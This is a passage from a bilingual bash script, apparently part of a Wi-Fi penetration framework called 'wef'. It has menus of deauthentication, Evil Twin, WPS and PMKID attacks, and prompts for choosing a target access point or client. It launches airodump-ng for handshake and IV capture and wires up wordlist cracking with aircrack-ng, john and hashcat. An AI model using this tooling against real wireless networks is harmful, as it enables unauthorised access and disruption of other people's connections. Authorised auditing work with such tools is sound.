    echo -e "${blueC}[${yC}2${blueC}] WIDS Confusion attack\t[${yC}10${blueC}] HIRTE attack${endC}"
    echo -e "${blueC}[${yC}3${blueC}] Authentication attack\t[${yC}11${blueC}] Caffe Latte attack${endC}"
    echo -e "${blueC}[${yC}4${blueC}] Beacon Flood attack\t\t[${yC}12${blueC}] Fake Auth attack${endC}"
    echo -e "${blueC}[${yC}5${blueC}] TKIP attack${endC}"
    echo -e "\n${blueC}--------${yC}WPS attacks${blueC}--------\t------${yC}Handshake attacks${blueC}-----\t------${yC}Other attacks${blueC}------${endC}"
    echo -e "${blueC}[${yC}6${blueC}] Pixie Dust attack\t\t[${yC}13${blueC}] WPA capture (w/o deauth)\t[${yC}17${blueC}] Auto PWN mode${endC}"
    echo -e "${blueC}[${yC}7${blueC}] PIN Bruteforce attack\t[${yC}14${blueC}] PMKID attack\t\t[${yC}18${blueC}] WPA3 dictionary attack${endC}"
    echo -e "${blueC}[${yC}8${blueC}] Null PIN attack\t\t[${yC}15${blueC}] Pwnagotchi mode ${endC}"
  else
    echo -e "${blueC}---------${yC}Ataques DoS${blueC}---------\t--------${yC}Ataques WEP${blueC}---------\t-----${yC}Ataques Rogue AP${blueC}-----${endC}"
    echo -e "${blueC}[${yC}1${blueC}] Ataque de deautenticación\t[${yC}9${blueC}]  Ataque ARP Replay\t\t[${yC}16${blueC}] Ataque EvilTwin${endC}"
    echo -e "${blueC}[${yC}2${blueC}] Ataque de confusión WIDS\t[${yC}10${blueC}] Ataque HIRTE${endC}"
    echo -e "${blueC}[${yC}3${blueC}] Ataque de autenticación\t[${yC}11${blueC}] Ataque Caffe Latte${endC}"
    echo -e "${blueC}[${yC}4${blueC}] Ataque Beacon Flood\t\t[${yC}12${blueC}] Ataque de falsa auth${endC}"
    echo -e "${blueC}[${yC}5${blueC}] Ataque TKIP${endC}"
    echo -e "\n${blueC}--------${yC}Ataques WPS${blueC}----------\t----${yC}Ataques de Handshake${blueC}----\t------${yC}Otros ataques${blueC}-------${endC}"
    echo -e "${blueC}[${yC}6${blueC}] Ataque Pixie Dust\t\t[${yC}13${blueC}] Captura WPA (sin deauth)\t[${yC}17${blueC}] Modo Auto PWN${endC}"
    echo -e "${blueC}[${yC}7${blueC}] Ataque de fuerza bruta\t[${yC}14${blueC}] Ataque PMKID\t\t[${yC}18${blueC}] Ataque WPA3 con diccionario${endC}"
    echo -e "${blueC}[${yC}8${blueC}] Ataque de PIN nulo\t\t[${yC}15${blueC}] Modo Pwnagotchi${endC}"
  fi
}

# Commands help panel
function commands_panel(){
  if [ "$lang" == "en" ]; then
    echo -e "\n   ${yC}COMMANDS:${endC}"

    echo -e "\n\t${yC}NETWORK ADAPTER:${endC}"
    echo -e "${blueC}\t enable\t\t\tenable monitor mode on the especified network interface${endC}"
    echo -e "${blueC}\t disable\t\tdisable monitor mode and enable managed mode on the especified network interface${endC}"
    echo -e "${blueC}\t mac\t\t\tchange interface MAC with a custom or random address${endC}"
    echo -e "${blueC}\t reg <country code>\tchange the regulatory domain of the network interface with the given country (i.e. reg JP)${endC}"
    echo -e "${blueC}\t check_vif\t\tcheck if your network adapter supports VIF (Virtual Interface)${endC}"

    echo -e "\n\t${yC}ACCESS POINTS:${endC}"
    echo -e "${blueC}\t scan\t\t\t\tscan nearby access points${endC}"
    echo -e "${blueC}\t list_aps\t\t\tlist already scanned APs${endC}"
    echo -e "${blueC}\t graph <file.csv> <output.png>\tcreate a graph (using airgraph-ng) of APs and its devices (especify an airodump-ng csv file)${endC}"

    echo -e "\n\t${yC}HANDSHAKES:${endC}"
    echo -e "${blueC}\t check <file.cap>\t\t\tcheck if given capture file contains at least one WPA or PMKID handshake${endC}"
    echo -e "${blueC}\t check_online\t\t\t\tcheck if handshakes uploaded to wpa-sec were found${endC}"
    echo -e "${blueC}\t crack <file.cap> <wordlist.txt>\tcrack given handshake with given wordlist using aircrack-ng${endC}"
    echo -e "${blueC}\t crack_online <file.cap>\t\tupload given handshake to wpa-sec (private key needed)${endC}"
    echo -e "${blueC}\t john <file.cap> <wordlist.txt>\t\tcrack given handshake with given wordlist using john the ripper${endC}"
    echo -e "${blueC}\t hashcat <file.cap> <wordlist.txt>\tcrack given handshake with given wordlist using hashcat${endC}"
    echo -e "${blueC}\t convert <file.cap> <output.hc22000>\tconvert given capture file to hashcat crackeable format${endC}"

    echo -e "\n\t${yC}INFORMATIVE:${endC}"
    echo -e "${blueC}\t identify <mac>\t\tprint vendor of given MAC address (i.e. D0:37:45:37:B5:6D -> TP-LINK)${endC}"
    echo -e "${blueC}\t info\t\t\tshow info about the network adapter interface${endC}"
    echo -e "${blueC}\t panel\t\t\tdisplay attack options panel${endC}"
    echo -e "${blueC}\t attacks\t\tshow info about the available attacks${endC}"
    echo -e "${blueC}\t chipsets\t\tlist chipsets that support monitor mode${endC}"

    echo -e "\n\t${yC}CONFIG:${endC}"
    echo -e "${blueC}\t update\t\t\tcheck if an update is available and ask you to install it${endC}"
    echo -e "${blueC}\t edit\t\t\tedit config file using default text editor (re-execute tool to apply changes)${endC}"
    echo -e "${blueC}\t clear/cls\t\tclear the screen${endC}"
    echo -e "${blueC}\t version\t\tprint the info about the version of wef${endC}"
    echo -e "${blueC}\t exit/quit\t\texit the framework${endC}"
    echo -e "${blueC}\t help/?\t\t\tprint this help panel${endC}"
  elif [ "$lang" == "es" ]; then
    echo -e "\n   ${yC}COMANDOS:${endC}"

    echo -e "\n\t${yC}ADAPTADOR DE RED:${endC}"
    echo -e "${blueC}\t enable\t\t\thabilita el modo monitor en la interfaz de red especificada${endC}"
    echo -e "${blueC}\t disable\t\tdesactiva el modo monitor y habilita el modo managed en la interfaz de red especificada${endC}"
    echo -e "${blueC}\t mac\t\t\tcambia la MAC de la interfaz por una dirección concreta o una aleatoria${endC}"
    echo -e "${blueC}\t reg <codigo del pais>\tcambia el dominio regulatorio de la interfaz de red con el país especificado (e.g. reg JP)${endC}"
    echo -e "${blueC}\t check_vif\t\tcomprueba si tu adaptador de red soporta VIF (Interfaz Virtual)${endC}"

    echo -e "\n\t${yC}PUNTOS DE ACCESO:${endC}"
    echo -e "${blueC}\t scan\t\t\t\tescanea los puntos de acceso cercanos${endC}"
    echo -e "${blueC}\t list_aps\t\t\tmuestra la lista de los APs escaneados${endC}"
    echo -e "${blueC}\t graph <file.csv> <output.png>\tcrea un gráfico (usando airgraph-ng) sobre los APs y sus clientes (especifica un archivo csv de airodump-ng)${endC}"

    echo -e "\n\t${yC}HANDSHAKES:${endC}"
    echo -e "${blueC}\t check <file.cap>\t\t\tcomprueba si el archivo especificado contiene al menos un handshake WPA o PMKID${endC}"
    echo -e "${blueC}\t check_online\t\t\t\tcomprueba si los handshakes subidos a wpa-sec han sido crackeados${endC}"
    echo -e "${blueC}\t crack <file.cap> <wordlist.txt>\tcrackea el handshake proporcionado con el wordlist especificado usando aircrack-ng${endC}"
    echo -e "${blueC}\t crack_online <file.cap>\t\tsube el handshake proporcionado a wpa-sec (se necesita una clave privada)${endC}"
    echo -e "${blueC}\t john <file.cap> <wordlist.txt>\t\tcrackea el handshake proporcionado con el wordlist especificado usando john the ripper${endC}"
    echo -e "${blueC}\t hashcat <file.cap> <wordlist.txt>\tcrackea el handshake proporcionado con el wordlist especificado usando hashcat${endC}"
    echo -e "${blueC}\t convert <file.cap> <output.hc22000>\tconvierte el archivo de captura a un formato crackeable con hashcat${endC}"

    echo -e "\n\t${yC}INFORMATIVO:${endC}"
    echo -e "${blueC}\t identify <mac>\t\tmuestra el vendor de la dirección MAC proporcionada (e.g. D0:37:45:37:B5:6D -> TP-LINK)${endC}"
    echo -e "${blueC}\t info\t\t\tmuestra información sobre la interfaz del adaptador de red${endC}"
    echo -e "${blueC}\t panel\t\t\tmuestra el panel con las opciones de los ataques${endC}"
    echo -e "${blueC}\t attacks\t\tmuestra info sobre los ataques disponibles${endC}"
    echo -e "${blueC}\t chipsets\t\tlista los chipsets que soportan modo monitor${endC}"

    echo -e "\n\t${yC}CONFIG:${endC}"
    echo -e "${blueC}\t update\t\t\tcomprueba si hay alguna actualización disponible y la instala${endC}"
    echo -e "${blueC}\t edit\t\t\tedita el archivo de config usando el editor de texto predeterminado (reejecuta WEF para aplicar los cambios)${endC}"
    echo -e "${blueC}\t clear/cls\t\tlimpia la pantalla${endC}"
    echo -e "${blueC}\t version\t\timprime la versión actual de la herramienta${endC}"
    echo -e "${blueC}\t exit/quit\t\tsalir del framework${endC}"
    echo -e "${blueC}\t help/?\t\t\timprime este panel de ayuda${endC}"
  fi
}

function evil_twin_panel() {
  if [ "$lang" == "en" ]; then
    panel_option "1" "Rogue AP + Captive Portal"
    panel_option "2" "Rogue AP + Captive Portal + DoS"
    panel_option "3" "Rogue AP + Captive Portal + WiFi Enterprise"
    panel_option "4" "Rogue AP + Captive Portal + WiFi Enterprise + DoS"
  else
    panel_option "1" "Rogue AP + Portal Cautivo"
    panel_option "2" "Rogue AP + Portal Cautivo + DoS"
    panel_option "3" "Rogue AP + Portal Cautivo + WiFi Enterprise"
    panel_option "4" "Rogue AP + Portal Cautivo + WiFi Enterprise + DoS"
  fi
}

# Chipsets for monitor mode
function chipsets_panel(){
  echo -e "\n\t${yC}Chipsets"
  echo -e "\t--------${blueC}"
  echo -e "\tMT7921AUN"
  echo -e "\tMT7921U"
  echo -e "\tMT7612U"
  echo -e "\tRT5572"
  echo -e "\tAR9271"
  echo -e "\tRT5370"
  echo -e "\tRT5372"
  echo -e "\tMT7610U"
  echo -e "\tRT3572"
  echo

  if [ -d "/sys/class/net/${monitor_interface}" ]; then
    status "${monitor_interface} chipset: ${greenC}${chipset}"
  elif [ -d "/sys/class/net/${managed_interface}" ]; then
    status "${managed_interface} chipset: ${greenC}${chipset}"
  fi
}




#
# Auxiliar functions to ask data to user (ESSID, BSSID, attack time, frames to send...)
#

function ask_to_exit(){
  if [ "$lang" == "en" ]; then
    input_no_line "Do you want to exit this tool? If not, you will return to the main menu (yes/no): " exit_status
  else
    input_no_line "¿Quieres salir de esta herramienta? Si no, volverás al menú principal (si/no): " exit_status
  fi

  ctrl_c_pressed="true"

  # If input is y or yes exit the function
  if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ]; then
    exit_wef
  elif [[ ( "$exit_status" != "n" && "$exit_status" != "no" ) || ! "$exit_status" ]]; then
    log_invalid_option
    ask_to_exit
  fi
}

function ask_target(){
  while true; do
    if [ "$lang" == "en" ]; then
      input_no_line "Introduce the number of the AP you want to attack: " number
    else
      input_no_line "Introduce el número del AP que quieras atacar: " number
    fi

    # Check that input is a valid number
    if [[ $number =~ ^[0-9]+$ ]]; then
      if [ $number -gt "$(echo -e "${original_aps}" | wc -l)" ]; then
        if [ "$lang" == "en" ]; then
          warning "Introduce a number lower than $(echo -e "${original_aps}" | wc -l)"
        else
          warning "Introduce un número menor que $(echo -e "${original_aps}" | wc -l)"
        fi
        continue
      elif [ $number -lt 1 ]; then
        if [ "$lang" == "en" ]; then
          warning "Introduce a number higher than 1"
        else
          warning "Introduce un número mayor que 1"
        fi
        continue
      fi
    fi

    if [[ $number =~ ^[0-9]+$ ]]; then
      break
    elif [ "$number" == "back" ]; then
      break
    elif [ "$number" == "exit" ] || [ "$number" == "quit" ]; then
      exit_wef
    else
      if [ "$lang" == "en" ]; then
        warning "Introduce a valid number"
      else
        warning "Introduce un número valido"
      fi
    fi
  done
}

function ask_target_client(){
  while true; do
    if [ "$lang" == "en" ]; then
      input_no_line "Introduce the number of the client you want to attack: " client_number
    else
      input_no_line "Introduce el número del cliente que quieras atacar: " client_number
    fi

    if [[ $client_number =~ ^[0-9]+$ ]]; then
      break
    elif [ "$client_number" == "break" ]; then
      break
    elif [ "${client_number}" == "exit" ] || [ "${client_number}" == "quit" ]; then
      exit_wef
    else
      if [ "$lang" == "en" ]; then
        warning "Introduce a valid number"
      else
        warning "Introduce un número valido"
      fi
    fi
  done
}

# Ask for attack duration
function ask_time(){
  while true; do
    if [ "$lang" == "en" ]; then
      input_no_line "Introduce attack duration (default=${default}): " attack_time
    else
      input_no_line "Introduce la duración del ataque (por defecto=${default}): " attack_time
    fi

    if [ "${attack_time}" == "exit" ] || [ "${attack_time}" == "quit" ]; then
      exit_wef
    fi

    if [ ! "${attack_time}" ]; then
      attack_time="${default}"
    fi

    if [ "${attack_time}" == "back" ]; then
      break
    elif [[ ${attack_time} =~ [^0-9ms] ]]; then
      if [ "$lang" == "en" ]; then
        warning "Invalid attack duration"
      else
        warning "Duración inválida"
      fi
    else
      break
    fi
  done
}

# Ask amount of deuth frames to send
function ask_frames(){
  while true; do
    if [ "$lang" == "en" ]; then
      input_no_line "Amount of deauth frames to send (default=${default}): " frames_to_send
    else
      input_no_line "Cantidad de paquetes de deautenticación a enviar (por defecto=${default}): " frames_to_send
    fi

    if [ ! "$frames_to_send" ]; then
      frames_to_send="${default}"
    fi

    if [[ $frames_to_send =~ ^[0-9]+$ ]]; then
      break
    elif [ "$frames_to_send" == "back" ]; then
      break
    elif [ "$frames_to_send" == "exit" ] || [ "$frames_to_send" == "quit" ]; then
      exit_wef
    else
      if [ "$lang" == "en" ]; then
        warning "Invalid number of frames to send"
      else
        warning "Número invalido de paquetes a enviar"
      fi
    fi
  done
}

# Ask user to capture handshakes
function ask_to_capture_handshakes(){
  while true; do
    if [ "$lang" == "en" ]; then
      input_no_line "Do you want to capture handshakes? (yes/no) (default=yes): " capture_handshakes
    else
      input_no_line "¿Quieres capturar los handshakes? (si/no) (por defecto=si): " capture_handshakes
    fi

    if [ "$capture_handshakes" == "exit" ] || [ "$capture_handshakes" == "quit" ]; then
      exit_wef
    fi

    # Check user input to start airodump or not
    if [ "$capture_handshakes" == "y" ] || [ "$capture_handshakes" == "yes" ] || [ "$capture_handshakes" == "s" ] || [ "$capture_handshakes" == "si" ] || [ ! "$capture_handshakes" ]; then
      launch_airodump
      break
    elif [ "$capture_handshakes" == "n" ] || [ "$capture_handshakes" == "no" ]; then
      c_h="false"
      break
    else
      log_invalid_option
    fi
  done
}

# Ask user to capture IVs
function ask_to_capture_ivs(){
  while true; do
    if [ "$lang" == "en" ]; then
      input_no_line "Do you want to capture IVs? (yes/no) (default=yes): " capture_ivs
    else
      input_no_line "¿Quieres capturar los IVs? (si/no) (por defecto=si): " capture_ivs
    fi

    if [ "$capture_ivs" == "exit" ] || [ "$capture_ivs" == "quit" ]; then
      exit_wef
    fi

    # Check user input to start airodump or not
    if [ "$capture_ivs" == "y" ] || [ "$capture_ivs" == "yes" ] || [ "$capture_ivs" == "s" ] || [ "$capture_ivs" == "si" ] || [ ! "$capture_ivs" ]; then
      if [ "$lang" == "en" ]; then
        info "Do not close airodump-ng window, it will be closed automatically"
      else
        info "No cierres la ventana de airodump-ng, se cerrará automaticamente"
      fi; sleep 0.2

      c_i="true"

      if [ "$airmon_check_kill" == "true" ]; then
        xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -c ${channel} -w \"${cache_path}/${cap_name}\" --essid \"${essid}\" ${monitor_interface}" 2>/dev/null &
      else
        airodump-ng -c ${channel} -w "${cache_path}/${cap_name}" --essid "${essid}" ${monitor_interface} &
      fi

      airodump_PID=$!
      break
    elif [ "$capture_ivs" == "n" ] || [ "$capture_ivs" == "no" ]; then
      c_i="false"
      break
    else
      log_invalid_option
    fi
  done
}

# Ask user for new interface name if it has changed when enabling monitor mode
function ask_new_name(){
  while true; do
    if [ "$lang" == "en" ]; then
      info_ln "In new interfaces nomenclature, the name changes after enabling monitor mode"
      input_no_line "The name of your network interface has changed, how is it called now?: " new_name
    else
      info_ln "Con la nueva nomenclatura de las interfaces, el nombre cambia despues de activar el modo monitor"
      input_no_line "El nombre de tu interfaz de red ha cambiado, ¿como se llama ahora?: " new_name
    fi

    if [ -d "/sys/class/net/${new_name}" ]; then
      monitor_interface=${new_name}
      ip link set "${monitor_interface}" up 2>/dev/null
      sleep 0.2
    else
      if [ "$lang" == "en" ]; then
        warning_ln "Especified interface does not exist"
      else
        warning_ln "La interfaz especificada no existe"
      fi
    fi
  done
}

function ask_to_crack_handshakes(){
  if [ "${c_h}" == "true" ]; then
    echo
    while true; do
      if [ "$(check_wpa_handshake "${output_path}/${ap_dir}/${cap_name}.cap")" == "true" ]; then
        if [ "$lang" == "en" ]; then
          input_no_line "Do you want to crack the WPA handshakes? This process may take a long time (yes/no): " crack_option
        else
          input_no_line "¿Quieres crackear los handshakes WPA? Este proceso puede tardar bastante tiempo (si/no): " crack_option
        fi
      elif [ "$(check_pmkid_handshake "${output_path}/${ap_dir}/${cap_name}.cap")" == "true" ] || [ -f "${output_path}/${ap_dir}/${cap_name}_pmkid_handshake.txt" ]; then
        if [ "$lang" == "en" ]; then
          input_no_line "Do you want to crack the PMKID handshake? This process may take a long time (yes/no): " crack_option
        else
          input_no_line "¿Quieres crackear el handshake PMKID? Este proceso puede tardar bastante tiempo (si/no): " crack_option
        fi
      else
        break
      fi

      if [ "${crack_option}" == "yes" ] || [ "${crack_option}" == "y" ] || [ "${crack_option}" == "si" ] || [ "${crack_option}" == "s" ]; then
        break
      elif [ "${crack_option}" == "no" ] || [ "${crack_option}" == "n" ]; then
        break
      elif [ "${crack_option}" == "back" ]; then
        break
      elif [ "${crack_option}" == "exit" ] || [ "${crack_option}" == "quit" ]; then
        exit_wef
      else
        log_invalid_option
      fi
    done
  fi
}

function ask_to_crack_ivs(){
  if [ "${c_i}" == "true" ]; then
    echo
    while true; do
      if [ "$lang" == "en" ]; then
        input_no_line "Do you want to crack the captured IVs? This process may take some time (yes/no): " crack_option
      else
        input_no_line "¿Quieres crackear los IVs obtenidos? Este proceso puede tardar un rato (si/no): " crack_option
      fi

      if [ "${crack_option}" == "yes" ] || [ "${crack_option}" == "y" ] || [ "${crack_option}" == "si" ] || [ "${crack_option}" == "s" ]; then
        break
      elif [ "${crack_option}" == "no" ] || [ "${crack_option}" == "n" ]; then
        break
      elif [ "${crack_option}" == "back" ]; then
        break
      elif [ "${crack_option}" == "exit" ] || [ "${crack_option}" == "quit" ]; then
        exit_wef
      else
        log_invalid_option
      fi
    done
  fi
}

function ask_cracking_method(){
  if [ "$lang" == "en" ]; then
    info_ln "Available ways to crack the handshakes:\n"
    panel_option "1" "aircrack-ng"
    panel_option "2" "john the ripper"
    panel_option "3" "hashcat\n"
  else
    info_ln "Métodos disponibles para crackear los handshakes:\n"
    panel_option "1" "aircrack-ng"
    panel_option "2" "john the ripper"
    panel_option "3" "hashcat\n"
  fi

  while true; do
    if [ "$lang" == "en" ]; then
      input_no_line "Select an option: " crack_option
    else
      input_no_line "Selecciona una opción: " crack_option
    fi

    if [ "$crack_option" == "1" ]; then
      echo
      crack_handshake_aircrack "${1}"
      break

    elif [ "$crack_option" == "2" ]; then
      john_tools_missing="false"
      if [ ! "$(command -v john)" ]; then
        log_command_not_found "john"
        john_tools_missing="true"
      fi

      if [ ! "$(command -v wpapcap2john)" ]; then
        log_command_not_found "wpapcap2john"
        john_tools_missing="true"
      fi

      if [ "$john_tools_missing" != "true" ]; then
        echo
        crack_handshake_john "${1}"
        break
      fi

    elif [ "$crack_option" == "3" ]; then
      hashcat_tools_missing="false"
      if [ ! "$(command -v hashcat)" ]; then
        log_command_not_found "hashcat"
        hashcat_tools_missing="true"
      fi

      if [ ! "$(command -v hcxpcapngtool)" ]; then
        log_command_not_found "hcxpcapngtool"
        hashcat_tools_missing="true"
      fi

      if [ "$hashcat_tools_missing" != "true" ]; then
        echo
        crack_handshake_hashcat "${1}"
        break
      fi
    fi
  done
}

# Ask the user to select a wordlist
function ask_wordlist(){
  if [ "$lang" == "en" ]; then
    info_ln "Available wordlists:"
    info_ln "If you want to use a custom dictionary, enter its full path\n"
  else
    info_ln "Diccionarios disponibles:"
    info_ln "Si quieres usar un diccionario personalizado escribe su ruta completa\n"
  fi

  panel_option "1" "rockyou.txt"
  panel_option "2" "probable-v2-wpa-top4800.txt"
  panel_option "3" "darkweb2017-top10000.txt"

  if [ "${kaonashi_path}" ]; then
    panel_option "4" "kaonashiWPA100M.txt"
  fi

  echo

  while true; do
    if [ "$lang" == "en" ]; then
      input_no_line "Select a wordlist to use: " dic_option
    else
      input_no_line "Selecciona un diccionario: " dic_option
    fi

    if [ "$dic_option" == "1" ] || [ "$dic_option" == "rockyou" ] || [ "$dic_option" == "rockyou.txt" ]; then
      wordlist_to_use="${rockyou_path}"
      break

    elif [ "$dic_option" == "2" ] || [ "$dic_option" == "probable" ] || [ "$dic_option" == "probable-v2-wpa-top4800.txt" ]; then
      wordlist_to_use="${probable_wpa_path}"
      break

    elif [ "$dic_option" == "3" ] || [ "$dic_option" == "darkweb" ] || [ "$dic_option" == "darkweb2017-top10000.txt" ]; then
      wordlist_to_use="${dark2017_path}"
      break

    elif [ "$dic_option" == "4" ] || [ "$dic_option" == "kaonashi" ] || [ "$dic_option" == "kaonashiWPA100M.txt" ]; then
      wordlist_to_use="${kaonashi_path}"
      break

    elif [ "$dic_option" == "back" ]; then
      break

    elif [ -f "${dic_option}" ]; then
      wordlist_to_use="${dic_option}"
      break

    elif [ "$dic_option" == "exit" ] || [ "$dic_option" == "quit" ]; then
      exit_wef

    else
      if [ "$lang" == "en" ]; then
        error "Especified wordlist does not exist. Select a valid wordlist"
      else
        error "El diccionario especificado no existe. Selecciona un diccionario valido"
      fi
    fi
  done
}



#
# Extra auxiliary functions
#

function get_date(){
  date +"%Y-%m-%d-%H-%M-%S"
}

function get_formatted_date(){
  date +"%d/%m/%y %H:%M:%S"
}

function get_current_time(){
  date +"%H:%M:%S"
}

function create_informative_report(){
  if [ ! -d "${reports_path}" ]; then
    mkdir "${reports_path}" 2>/dev/null
  fi

  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
    report_name="${essid}_${ap_bssid}_$(get_date)"
  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
    report_name="${ap_bssid}_$(get_date)"
  fi

  # Check empty essid
  if [ ! "${essid}" ]; then
    essid="<unknown>"
  fi

  # Check empty bssid
  if [ ! "${ap_bssid}" ]; then
    ap_bssid="Not especified"
  fi

  # No channel
  if [ ! "${channel}" ]; then
    channel="Not especified"
  fi

  # Copy HTML report template
  echo -e "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogIDx0aXRsZT5XaS1GaSBBdWRpdCBSZXBvcnQ8L3RpdGxlPgogIDxzdHlsZT4KICAgIGJvZHkgewogICAgICBmb250LWZhbWlseTogQXJpYWwsIHNhbnMtc2VyaWY7CiAgICAgIG1hcmdpbjogNDBweDsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2Y3ZjdmNzsKICAgICAgY29sb3I6ICMzMzM7CiAgICB9CiAgICBoZWFkZXIgewogICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgIG1hcmdpbi1ib3R0b206IDQwcHg7CiAgICB9CiAgICBoMSB7CiAgICAgIGZvbnQtc2l6ZTogMzJweDsKICAgICAgbWFyZ2luLWJvdHRvbTogNXB4OwogICAgfQogICAgaDIgewogICAgICBib3JkZXItYm90dG9tOiAxcHggc29saWQgI2NjYzsKICAgICAgcGFkZGluZy1ib3R0b206IDVweDsKICAgICAgbWFyZ2luLXRvcDogNDBweDsKICAgIH0KICAgIC5zZWN0aW9uIHsKICAgICAgbWFyZ2luLWJvdHRvbTogMzBweDsKICAgIH0KICAgIHRhYmxlIHsKICAgICAgd2lkdGg6IDEwMCU7CiAgICAgIGJvcmRlci1jb2xsYXBzZTogY29sbGFwc2U7CiAgICAgIG1hcmdpbi10b3A6IDEwcHg7CiAgICB9CiAgICB0aCwgdGQgewogICAgICBib3JkZXI6IDFweCBzb2xpZCAjZGRkOwogICAgICBwYWRkaW5nOiA4cHg7CiAgICB9CiAgICB0aCB7CiAgICAgIGJhY2tncm91bmQtY29sb3I6ICNlZWU7CiAgICB9CiAgICAuaGlnaGxpZ2h0IHsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZWZjMTsKICAgIH0KICAgIC5zdWNjZXNzIHsKICAgICAgY29sb3I6IGdyZWVuOwogICAgICBmb250LXdlaWdodDogYm9sZDsKICAgIH0KICAgIC5mYWlsIHsKICAgICAgY29sb3I6IHJlZDsKICAgICAgZm9udC13ZWlnaHQ6IGJvbGQ7CiAgICB9CiAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KCiAgPGhlYWRlcj4KICAgIDxoMT5XaS1GaSBTZWN1cml0eSBBdWRpdCBSZXBvcnQ8L2gxPgogICAgPHA+PHN0cm9uZz5EYXRlOjwvc3Ryb25nPiB7e0RBVEV9fTwvcD4KICA8L2hlYWRlcj4KCiAgPHNlY3Rpb24gY2xhc3M9InNlY3Rpb24iPgogICAgPGgyPjEuIEdlbmVyYWwgSW5mb3JtYXRpb248L2gyPgogICAgPHA+PHN0cm9uZz5PYmplY3RpdmU6PC9zdHJvbmc+IEFzc2VzcyB0aGUgc2VjdXJpdHkgb2YgYSBXaS1GaSBuZXR3b3JrLjwvcD4KICAgIDxwPjxzdHJvbmc+SGFyZHdhcmUgVXNlZDo8L3N0cm9uZz4ge3tIQVJEV0FSRX19PC9wPgogICAgPHA+PHN0cm9uZz5PcGVyYXRpbmcgU3lzdGVtOjwvc3Ryb25nPiB7e09TfX08L3A+CiAgPC9zZWN0aW9uPgoKICA8c2VjdGlvbiBjbGFzcz0ic2VjdGlvbiI+CiAgICA8aDI+Mi4gTmV0d29yayBEZXRhaWxzPC9oMj4KICAgIDx0YWJsZT4KICAgICAgPHRyPgogICAgICAgIDx0aD5TU0lEPC90aD4KICAgICAgICA8dGg+QlNTSUQ8L3RoPgogICAgICAgIDx0aD5DaGFubmVsPC90aD4KICAgICAgICA8dGg+U2VjdXJpdHk8L3RoPgogICAgICAgIDx0aD5Db25uZWN0ZWQgQ2xpZW50czwvdGg+CiAgICAgIDwvdHI+CiAgICAgIDx0cj4KICAgICAgICA8dGQgY2xhc3M9ImhpZ2hsaWdodCI+e3tTU0lEfX08L3RkPgogICAgICAgIDx0ZD57e0JTU0lEfX08L3RkPgogICAgICAgIDx0ZD57e0NIQU5ORUx9fTwvdGQ+CiAgICAgICAgPHRkPnt7U0VDVVJJVFl9fTwvdGQ+CiAgICAgICAgPHRkPnt7Q0xJRU5UU319PC90ZD4KICAgICAgPC90cj4KICAgIDwvdGFibGU+CiAgPC9zZWN0aW9uPgoKICA8c2VjdGlvbiBjbGFzcz0ic2VjdGlvbiI+CiAgICA8aDI+My4gSGFuZHNoYWtlIENhcHR1cmU8L2gyPgogICAgPHA+PHN0cm9uZz5TdGF0dXM6PC9zdHJvbmc+IDxzcGFuIGNsYXNzPSJoaWdobGlnaHQiPnt7SFNfU1RBVFVTfX08L3NwYW4+PC9wPgogICAgPHA+PHN0cm9uZz5DYXB0dXJlZCBGaWxlOjwvc3Ryb25nPiB7e0hTX0ZJTEV9fTwvcD4KICAgIDxwPjxzdHJvbmc+VG9vbCBVc2VkOjwvc3Ryb25nPiBhaXJvZHVtcC1uZzwvcD4KICA8L3NlY3Rpb24+CgogIDxzZWN0aW9uIGNsYXNzPSJzZWN0aW9uIj4KICAgIDxoMj40LiBFeGVjdXRlZCBBdHRhY2tzPC9oMj4KICAgIDx1bD4KICAgICAgPGxpPnt7RVhFQ1VURURfQVRUQUNLfX08L2xpPgogICAgPC91bD4KICA8L3NlY3Rpb24+CgogIDxzZWN0aW9uIGNsYXNzPSJzZWN0aW9uIj4KICAgIDxoMj41LiBPYnRhaW5lZCBDcmVkZW50aWFsczwvaDI+CiAgICA8cD48c3Ryb25nPlBhc3N3b3JkOjwvc3Ryb25nPiA8c3BhbiBjbGFzcz0iaGlnaGxpZ2h0Ij57e1BBU1NXT1JEfX08L3NwYW4+PC9wPgogIDwvc2VjdGlvbj4KCiAgPHNlY3Rpb24gY2xhc3M9InNlY3Rpb24iPgogICAgPGgyPjYuIFJlY29tbWVuZGF0aW9uczwvaDI+CiAgICA8dWw+CiAgICAgIDxsaT5VcGdyYWRlIHRoZSBhY2Nlc3MgcG9pbnQgdG8gV1BBMyBpZiBzdXBwb3J0ZWQuPC9saT4KICAgICAgPGxpPlVzZSBzdHJvbmcsIHJhbmRvbWx5IGdlbmVyYXRlZCBwYXNzd29yZHMgKG1pbmltdW0gMTYgY2hhcmFjdGVycykuPC9saT4KICAgICAgPGxpPkRpc2FibGUgV1BTIGZ1bmN0aW9uYWxpdHkgb24gdGhlIHJvdXRlci48L2xpPgogICAgICA8bGk+TW9uaXRvciBjb25uZWN0ZWQgY2xpZW50cyBhbmQgdW5hdXRob3JpemVkIGFjY2VzcyByZWd1bGFybHkuPC9saT4KICAgIDwvdWw+CiAgPC9zZWN0aW9uPgoKICA8c2VjdGlvbiBjbGFzcz0ic2VjdGlvbiI+CiAgICA8aDI+Ny4gQ29uY2x1c2lvbjwvaDI+CiAgICA8cD57e0NPTkNMVVNJT059fTwvcD4KICA8L3NlY3Rpb24+Cgo8L2JvZHk+CjwvaHRtbD4KCg==" | base64 -d > "${reports_path}/${report_name}.html"

  # Replace placeholders with values
  sed -i "s|{{DATE}}|$(get_formatted_date)|g" "${reports_path}/${report_name}.html"
  sed -i "s|{{HARDWARE}}|${network_adapter}|g" "${reports_path}/${report_name}.html"
  sed -i "s|{{OS}}|${operative_system}|g" "${reports_path}/${report_name}.html"
  sed -i "s|{{SSID}}|${essid}|g" "${reports_path}/${report_name}.html"
  sed -i "s|{{BSSID}}|${ap_bssid}|g" "${reports_path}/${report_name}.html"
